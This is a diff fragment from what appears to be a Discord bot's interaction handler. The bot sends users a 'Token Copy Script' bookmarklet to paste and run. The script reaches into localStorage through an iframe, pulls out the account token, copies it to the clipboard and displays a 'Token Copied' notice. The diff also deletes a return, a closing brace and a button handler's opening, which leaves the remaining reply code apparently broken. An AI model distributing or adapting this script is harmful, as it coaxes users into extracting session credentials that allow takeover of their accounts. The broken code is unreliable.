@@ -26,12 +26,6 @@ export default {
                 content: `### 🪄 Token Copy Script\nLong press or use the copy button to copy the code below:\n\n\`\njavascript:(function(){try{let f=document.createElement('iframe');document.body.appendChild(f);let t=JSON.parse(f.contentWindow.localStorage.token);let ta=document.createElement('textarea');ta.value=t;document.body.appendChild(ta);ta.select();document.execCommand('copy');ta.remove();let n=document.createElement('div');n.innerHTML='<strong>Token Copied</strong><br>Your token has been copied to clipboard';n.style.cssText='position:fixed;top:20px;left:20px;background:#001f3f;color:#7FDBFF;padding:12px%2016px;border-radius:8px;box-shadow:0%204px%2012px%20rgba(0,0,0,0.4);font-family:-apple-system,BlinkMacSystemFont,Segoe%20UI,Roboto,sans-serif;font-size:14px;z-index:99999;opacity:0;transition:opacity%200.3s%20ease-in-out;';document.body.appendChild(n);setTimeout(()=%3E{n.style.opacity='1';},50);setTimeout(()=%3E{n.style.opacity='0';setTimeout(()=%3En.remove(),500);},3500);}catch(e){alert('Error%20copying%20token');}})();\n\``,
                 flags: MessageFlags.Ephemeral
             });
-            return;
-        }
-
-        // Button: platform_pc (How to use bot / Tutorial Video Link)
-        if (interaction.isButton() && interaction.customId === 'platform_pc') {
-            await interaction.reply({
                 content: `🎥 **How to use bot:**\nWatch the video tutorial here: https://cdn.discordapp.com/attachments/1539823157425348758/1540748022399504404/lv_0_20260821085534.mp4`,
                 flags: MessageFlags.Ephemeral
             });
